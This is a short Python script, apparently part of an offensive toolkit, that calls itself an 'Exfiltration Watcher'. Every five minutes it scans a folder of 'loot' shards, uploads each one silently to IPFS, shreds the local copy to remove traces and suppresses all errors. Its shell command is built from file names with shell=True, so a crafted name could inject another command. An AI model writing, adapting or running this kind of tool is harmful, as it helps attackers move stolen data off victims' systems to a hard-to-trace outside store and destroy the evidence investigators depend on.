import os
import subprocess
import time

# Watch for incoming shards from the mesh
LOOT_DIR = "./shards"
COLD_STORAGE_CMD = "ipfs add -Q" # Or your preferred decentralized tool

def secure_the_bag():
    print("[*] [GHOST] Exfiltration Watcher Active...")
    while True:
        for shard in os.listdir(LOOT_DIR):
            shard_path = os.path.join(LOOT_DIR, shard)
            # Upload to IPFS silently
            try:
                ipfs_hash = subprocess.check_output(f"{COLD_STORAGE_CMD} {shard_path}", shell=True)
                print(f"[+] [EXFIL] Shard {shard} secured at: {ipfs_hash.decode().strip()}")
                # Shred local copy after confirmation
                os.system(f"shred -u {shard_path}")
            except:
                pass
        time.sleep(300) # Check every 5 minutes

if __name__ == "__main__":
    secure_the_bag()
